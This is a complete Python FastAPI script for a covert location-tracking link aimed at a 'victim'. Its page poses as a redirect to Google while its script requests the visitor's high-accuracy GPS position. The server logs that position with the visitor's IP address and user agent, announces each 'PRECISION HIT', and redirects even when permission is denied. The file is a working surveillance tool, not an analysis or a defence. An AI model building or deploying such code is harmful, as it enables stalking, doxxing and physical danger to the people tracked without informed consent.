from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse
import json
from datetime import datetime

app = FastAPI()
LOG_FILE = "precision_logs.json"

# 1. The Landing Page (Triggers the Geolocation request)
@app.get("/track/{victim_id}", response_class=HTMLResponse)
async def landing_page(victim_id: str):
    html_content = f"""
    <html>
        <head>
            <title>Loading...</title>
            <script>
                function sendLocation() {{
                    if (navigator.geolocation) {{
                        // Request high accuracy (enables GPS/Wi-Fi positioning)
                        navigator.geolocation.getCurrentPosition(
                            (position) => {{
                                const data = {{
                                    lat: position.coords.latitude,
                                    lon: position.coords.longitude,
                                    acc: position.coords.accuracy,
                                    id: "{victim_id}"
                                }};
                                fetch("/log-coordinates", {{
                                    method: "POST",
                                    headers: {{ "Content-Type": "application/json" }},
                                    body: JSON.stringify(data)
                                }}).then(() => {{
                                    window.location.href = "https://www.google.com";
                                }});
                            }},
                            (error) => {{
                                // If they deny permission, just redirect anyway
                                window.location.href = "https://www.google.com";
                            }},
                            {{ enableHighAccuracy: true, timeout: 5000 }}
                        );
                    }} else {{
                        window.location.href = "https://www.google.com";
                    }}
                }}
            </script>
        </head>
        <body onload="sendLocation()">
            <p>Redirecting to Google...</p>
        </body>
    </html>
    """
    return HTMLResponse(content=html_content)

# 2. The API Endpoint (Receives the JS data)
@app.post("/log-coordinates")
async def log_coordinates(request: Request):
    data = await request.json()
    
    # Enrich with IP and User-Agent from headers
    forwarded_for = request.headers.get("x-forwarded-for")
    ip = forwarded_for.split(",")[0].strip() if forwarded_for else request.client.host
    user_agent = request.headers.get("user-agent")
    
    log_entry = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "victim_id": data.get("id"),
        "ip": ip,
        "latitude": data.get("lat"),
        "longitude": data.get("lon"),
        "accuracy_meters": data.get("acc"),
        "user_agent": user_agent
    }

    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(log_entry) + "\n")
    
    print(f"[*] PRECISION HIT: {data.get('lat')}, {data.get('lon')} (+/- {data.get('acc')}m)")
    return {"status": "success"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8080)
